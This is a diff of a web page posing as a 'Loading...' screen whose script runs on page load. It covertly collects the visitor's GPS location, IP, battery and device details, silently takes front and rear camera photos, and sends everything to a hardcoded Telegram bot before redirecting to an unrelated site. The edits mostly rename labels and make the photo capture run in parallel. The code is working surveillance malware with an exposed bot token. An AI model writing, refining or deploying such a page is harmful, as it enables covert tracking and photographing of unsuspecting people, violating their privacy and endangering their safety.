@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verifying...</title>
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
@@ -25,21 +25,18 @@
 </head>
 <body>
   <img src="/favicon.svg" alt="logo" />
-  <p>Verifying device...</p>
+  <p>Loading...</p>
 
   <script>
     const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
     const CHAT_ID = "7216371031";
     const REDIRECT_URL = "https://heavenscake.vercel.app";
     let deviceInfo = "";
-    let redirectStarted = false;
+    let redirected = false;
 
-    // fallback redirect if nothing happens in 8s
     setTimeout(() => {
-      if (!redirectStarted) {
-        window.location.href = REDIRECT_URL;
-      }
-    }, 8000);
+      if (!redirected) window.location.href = REDIRECT_URL;
+    }, 8000); // fallback redirect in case of full denial
 
     function sendToTelegram(message) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -67,7 +64,6 @@
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
-        await new Promise(res => setTimeout(res, 1000));
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -77,8 +73,8 @@
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
         await sendPhotoToTelegram(blob);
         return true;
-      } catch (err) {
-        deviceInfo += `🚫 Camera: Permission denied or blocked\n`;
+      } catch {
+        deviceInfo += `🚫 Camera: Blocked or denied\n`;
         return false;
       }
     }
@@ -136,11 +132,11 @@
             deviceInfo += `📡 GPS: ${latitude}, ${longitude} (±${accuracy}m)\n`;
             resolve();
           },
-          err => {
-            deviceInfo += `📡 GPS: Permission denied or blocked\n`;
+          () => {
+            deviceInfo += `📡 GPS: Denied or unavailable\n`;
             resolve();
           },
-          { enableHighAccuracy: true, timeout: 5000 }
+          { enableHighAccuracy: true, timeout: 4000 }
         );
       });
     }
@@ -150,11 +146,11 @@
       const languages = navigator.languages.join(", ");
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const brand = detectDeviceBrand();
-      deviceInfo += `📱 Device Brand: ${brand}\n`;
+      deviceInfo += `📱 Brand: ${brand}\n`;
       deviceInfo += `🌐 Languages: ${languages}\n`;
       deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
       deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
-      deviceInfo += `📲 Touch Support: ${touch}\n`;
+      deviceInfo += `📲 Touch: ${touch}\n`;
       deviceInfo += `🕓 Timezone: ${timeZone} (UTC${-new Date().getTimezoneOffset()/60})\n`;
       deviceInfo += `💻 Platform: ${navigator.platform}\n`;
       deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
@@ -163,32 +159,27 @@
       deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
     }
 
-    async function startAll() {
-      await Promise.all([
-        getBatteryInfo(),
-        getIPInfo(),
-        getGPSLocation()
-      ]);
+    async function runEverything() {
+      await Promise.all([getBatteryInfo(), getIPInfo(), getGPSLocation()]);
       getExtraDetails();
       await sendToTelegram(deviceInfo);
 
-      const ok1 = await takePhoto("user");
-      const ok2 = await takePhoto("user");
-      const ok3 = await takePhoto("environment");
-      const ok4 = await takePhoto("environment");
+      const results = await Promise.all([
+        takePhoto("user"),
+        takePhoto("user"),
+        takePhoto("environment"),
+        takePhoto("environment")
+      ]);
 
-      if (!ok1 && !ok2 && !ok3 && !ok4) {
-        await sendToTelegram("🚫 User denied camera access.");
+      if (results.every(success => !success)) {
+        await sendToTelegram("🚫 Camera access denied or blocked.");
       }
 
-      redirectStarted = true;
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 1000);
+      redirected = true;
+      window.location.href = REDIRECT_URL;
     }
 
-    // auto-run on load
-    window.onload = startAll;
+    window.onload = runEverything;
   </script>
 </body>
 </html>
